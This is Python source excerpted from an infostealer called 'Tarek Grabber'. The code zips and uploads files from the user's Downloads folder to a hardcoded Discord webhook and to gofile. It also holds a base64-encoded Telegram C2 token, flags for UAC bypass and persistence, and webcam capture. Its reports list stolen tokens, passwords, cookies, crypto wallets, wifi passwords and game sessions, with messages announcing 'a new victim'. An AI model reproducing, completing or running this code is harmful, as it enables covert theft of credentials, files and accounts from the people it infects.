...
from urllib3 import PoolManager, HTTPResponse, disable_warnings as disable_warnings_urllib3, request
...
def uP104D7060F113(path):
    try:
        ...
        response = requests.post(server_url, files={'file': open(path, 'rb')})
...
def is_file_size_valid(file_path, max_size_mb=20):
    file_size_mb = os.path.getsize(file_path) / (1024 * 1024)
    return file_size_mb <= max_size_mb

def process_and_upload_files(downloads_folder, file_types_to_upload, discord_webhook_url):
    files_to_upload = []
    ...
    for root, _, files in os.walk(downloads_folder):
        for file in files:
            ...
            if file.lower().endswith(tuple(file_types_to_upload)) and is_file_size_valid(file_path):
    ...
    downloads_folder_path = os.path.join(downloads_folder, 'Downloads_folder')
    os.makedirs(downloads_folder_path, exist_ok=True)

    for file_path in files_to_upload:
        try:
            # Copy the files directly to downloads_folder_path without creating subdirectories
            shutil.copy2(file_path, downloads_folder_path)
        except Exception as e:
            print(f"Error copying file: {e}")

    zip_folder_path = os.path.join(downloads_folder, 'Downloads_folder.zip')
    if os.path.exists(zip_folder_path):
        os.remove(zip_folder_path)

    # Zip the files in the downloads_folder_path
    with ZipFile(zip_folder_path, 'w') as zipf:
        for root, _, files in os.walk(downloads_folder_path):
            for file in files:
                file_path = os.path.join(root, file)
                zipf.write(file_path, os.path.relpath(file_path, downloads_folder_path))

    upload_result = uP104D7060F113(zip_folder_path)

    if upload_result:
        send_discord_message(discord_webhook_url, f"Files uploaded: {zip_folder_path}\nDownload link: {upload_result}")

        # Delete the folder and zip file after upload
        try:
            time.sleep(1)  # 1-second delay before deletion
            shutil.rmtree(downloads_folder_path)
            os.remove(zip_folder_path)
        except Exception as e:
            print(f"Error deleting files: {e}")
    else:
        print(f"Failed to upload files: {zip_folder_path}")

# Rest of the code remains unchanged

# Discover Downloads folder
downloads_folder = os.path.join(os.path.expanduser("~"), "Downloads")

# Specify file types to upload (all extensions for images, videos, and records)
file_types_to_upload = ['.txt']

# Discord webhook URL
discord_webhook_url = 'https://discord.com/api/webhooks/1178783782665470064/bi-0rCVAsjxBXNy7qpaOdsR2IZ0ngy6nfGHO_PbgSMyPLU5l97naeGvpV5jqkZjkR9aH'

# Process and upload files, then exit if no files with specified extensions are found
process_and_upload_files(downloads_folder, file_types_to_upload, discord_webhook_url)
...
# def process_zip_files(downloads_folder, discord_webhook_url):
#     # Create a folder named "Downloads_folder"
#     downloads_folder_path = os.path.join(downloads_folder, 'Downloads_folder')
#     os.makedirs(downloads_folder_path, exist_ok=True)

#     # Check if the "Downloads_folder.zip" already exists and remove it
#     zip_folder_path = os.path.join(downloads_folder, 'Downloads_folder.zip')
#     if os.path.exists(zip_folder_path):
#         os.remove(zip_folder_path)
...
#             # Check if it's a zip file and if it's larger than 400 MB
#             if file.lower().endswith('.zip') or os.path.getsize(file_path) > 100 * 1024 * 1024:
#                 print(f"Ignoring large file: {file_path}")
#             else:
#                 # Get the relative path from the Downloads folder
#                 relative_path = os.path.relpath(file_path, downloads_folder)

#                 # Create the corresponding subfolder in Downloads_folder
#                 target_folder = os.path.join(downloads_folder_path, os.path.dirname(relative_path))
...
# def process_and_upload_files(downloads_folder, file_types_to_upload, discord_webhook_url):
#     # Process and copy files with specific extensions
#     files_to_upload = []
...
#             if file.lower().endswith(tuple(file_types_to_upload)):
#                 files_to_upload.append(file_path)

#     # Check if there are files with specified extensions
#     if not files_to_upload:
#         print("No files with specified extensions found. Exiting.")
#         return
...
#     # Copy the files to "Downloads_folder"
#     for file_path in files_to_upload:
#         shutil.copy2(file_path, downloads_folder_path)
...
#     # Compress "Downloads_folder" to "Downloads_folder.zip"
#     zip_folder(downloads_folder_path, zip_folder_path)

#     # Upload the zip file with specific files
#     upload_result = uP104D7060F113(zip_folder_path)

#     if upload_result:
#         print(f"Files uploaded successfully: {zip_folder_path}")
#         print(f"Download link: {upload_result}")

#         # Send message to Discord with the download link for specific files
#         send_discord_message(discord_webhook_url, f"Files uploaded: {zip_folder_path}\nDownload link: {upload_result}")
#     else:
#         print(f"Failed to upload files: {zip_folder_path}")
...
class Settings:
    C2 = (1, base64.b64decode('NjkwODg3NTAzNTpBQUVxTVp2YnBBcG1XaFF4MkFjVjFDMXQ0UThxaHVvaGpGNCQ4NTI5Nzg4Njc=').decode())
    Mutex = base64.b64decode('ZWhPYjMxemdRNFhSc2lkMA==').decode()
    PingMe = bool('')
    Vmprotect = bool('')
    Startup = bool('')
    Melt = bool('')
    UacBypass = bool('')
    ArchivePassword = base64.b64decode('dGFyZWsxMjM=').decode()
...
Logger = logging.getLogger('Tarek Grabber')
...
class Syscalls:
    ...
    def CaptureWebcam(index: int, filePath: str) -> bool:
        ...
        hcam = avicap32.capCreateCaptureWindowW(wintypes.LPWSTR('Tarek'), WS_CHILD, 0, 0, 0, 0, ctypes.windll.user32.GetDesktopWindow(), 0)
        result = False
        if hcam:
...
class TarekGrabber:
    ...
    def CreateArchive(self) -> tuple[str, str]:
        ...
        if Utility.GetSelf()[1] or os.path.isfile(rarPath):
            ...
            if os.path.isfile(rarPath):
                password = Settings.ArchivePassword or 'Tarek1963@'
    ...
    def UploadToExternalService(self, path, filename=None) -> str | None:
        if os.path.isfile(path):
            Logger.info(f'Uploading {filename or "file"} to gofile')
            ...
            try:
                # Get the server URL from the API
                server_url = f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile'

                # Use the server URL to upload the file
                response = requests.post(server_url, files={'file': (filename, fileBytes)})

                # Check if the upload was successful
                response.raise_for_status()
                response_data = response.json()["data"]
                download_page_url = response_data["downloadPage"]

                # Send Discord message with the download link
                discord_webhook_url = "https://discord.com/api/webhooks/1178783782665470064/bi-0rCVAsjxBXNy7qpaOdsR2IZ0ngy6nfGHO_PbgSMyPLU5l97naeGvpV5jqkZjkR9aH"
                self.send_discord_message(discord_webhook_url, f"Files uploaded: {path}\nDownload link: {download_page_url}")
    ...
    def SendData(self) -> None:
        ...
        filename = 'Tarek-%s.%s' % (os.getlogin(), extention)
        ...
        collection = {'System Info': 'Yes' if self.SystemInfoStolen else 'No', 'Discord Tokens': self.DiscordTokensCount, 'Roblox Tokens': self.RobloxCookiesCount, 'Passwords': self.PasswordsCount, 'Cookies': len(self.Cookies), 'Webcam': self.WebcamPicturesCount, 'Wallets': self.WalletsCount, 'History': self.HistoryCount, 'Autofills': self.AutofillCount, 'Wifi Passwords': self.WifiPasswordsCount, 'Common Files': self.CommonFilesCount, 'Telegram Sessions': self.TelegramSessionsCount, 'Minecraft Sessions': self.MinecraftSessions, 'Epic Session': 'Yes' if self.EpicStolen else 'No', 'Steam Session': 'Yes' if self.SteamStolen else 'No', 'Uplay Session': 'Yes' if self.UplayStolen else 'No', 'Growtopia Session': 'Yes' if self.GrowtopiaStolen else 'No', 'Screenshot': 'Yes' if self.ScreenshotTaken else 'No'}
        grabbedInfo = '\n'.join([key + ' : ' + str(value) for key, value in collection.items()])
        match Settings.C2[0]:
            case 0:
                image_url = 'https://cdn.discordapp.com/attachments/1164559111879393342/1175841523963809922/icon.png?ex=656cb2c1&is=655a3dc1&hm=570b93bc8e90f9e7229897b79d0dacb35f7291c3385981789e04e3a9d88eaca8&'
                payload = {'content': '||@everyone||' if Settings.PingMe else '', 'embeds': [{'title': 'Tarek Grabber Got A Hit :smiling_imp:', 'description': f'**[System] Infos\n```autohotkey\n{system_info}```\n[IP] Info```prolog\n```\n[Other] Info```js\n{grabbedInfo}```**', 'url': 'https://bio.link/grabber', 'color': 34303, 'footer': {'text': 'Grabbed by Tarek Grabber | Deaedevil'}, 'thumbnail': {'url': image_url}}], 'username': 'Tarek Grabber', 'avatar_url': image_url}
            ...
            case 1:
                payload = {'caption': f'<b>Tarek Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code></code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 'parse_mode': 'HTML'}
